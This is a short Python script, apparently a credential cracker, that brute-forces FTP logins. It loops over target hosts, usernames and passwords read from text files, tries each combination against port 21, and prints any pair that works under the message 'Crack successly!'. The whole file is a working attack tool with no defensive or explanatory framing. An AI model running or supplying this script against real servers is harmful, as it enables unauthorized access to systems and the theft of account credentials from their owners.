#-*- coding: UTF-8 -*-
from ftplib import FTP
import ftplib
def Login(host,username,password):
    ftp=FTP()
    try:
        ftp.connect(host,21,1)
        ftp.login(username,password)
        print('Crack successly!')
        print('username：' ,username)
        print('Password：' , password)
        return True
    except:
        pass
if __name__ == '__main__':
        host=open('host.txt')
        for line in host:
                host=line.strip('\n')
                print('Target：' + host)
                user=open('user.txt')
                for line in user:
                        user=line.strip('\n')
                        pwd=open('pwd.txt','r')
                        for line in pwd:
                                pwd=line.strip('\n')
                                Login(host,user,pwd)